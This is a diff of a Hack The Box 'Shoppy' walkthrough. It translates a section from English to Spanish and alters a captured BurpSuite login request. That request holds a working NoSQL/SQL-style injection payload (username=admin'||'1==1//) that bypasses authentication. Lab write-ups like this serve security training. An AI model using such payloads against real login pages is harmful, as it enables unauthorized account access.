@@ -91,11 +91,9 @@ Se descubrió dos URL interesantes `http://shoppy.htb/login y http://shoppy.htb/
 
 ### Acceder como administrador
 
-If we are using a single quote (`'`) in the username field, we receive a `504 Gateway Time-out`. We have our first error message. We need to perform some more enumeration. This part of the machine, was the most confusing part of this box. It took me some time to find out how to get a foothold on this machine.
+Ahora en la URL login.
 
-The error message shows the URL `http://shoppy.htb/login?error=WrongCredentials`
-
-Let’s try various payloads in the login form. After a long time of trying, we are able to find the right payload to bypass the login mechanism through BurpSuite.
+Si usamos una comillas simple (') en el campo de nombre de usuario, recibimos un 504 Gateway Time-out. Tenemos nuestro primer mensaje de error.El mensaje de error muestra la URL http://shoppy.htb/login?error=WrongCredentialsProbemos diferentes cargas útiles en el formulario de inicio de sesión.La carga útil adecuada para eludir el mecanismo de inicio de sesión a través de BurpSuite.
 
 ```
 POST /login HTTP/1.1
@@ -111,7 +109,7 @@ Connection: close
 Referer: http://shoppy.htb/login
 Upgrade-Insecure-Requests: 1
 
-username=admin'||'1==1//&password=toto
+username=admin'||'1==1//&password=admin
 
 ```
 
